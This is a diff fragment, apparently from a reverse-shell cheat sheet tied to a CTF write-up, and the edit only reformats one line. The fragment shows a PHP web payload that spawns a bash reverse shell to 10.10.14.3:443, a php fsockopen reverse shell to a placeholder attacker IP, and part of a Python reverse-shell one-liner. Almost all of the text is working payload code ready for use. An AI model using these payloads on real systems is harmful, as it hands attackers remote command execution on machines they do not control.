@@ -23,8 +23,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 # Example 1
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'");?>
 # Example 2
-php -r '$sock=fsockopen(“<attacker_IP>”,<attacker_PORT>); exec(“/bin/sh -I
-<&3 >&3 2>&3”);'
+php -r '$sock=fsockopen(“<attacker_IP>”,<attacker_PORT>); exec(“/bin/sh -I <&3 >&3 2>&3”);'
 ```
 Example:
 [Fulcrum](https://shuciran.github.io/posts/Fulcrum/#fnref:rev-shell-php)
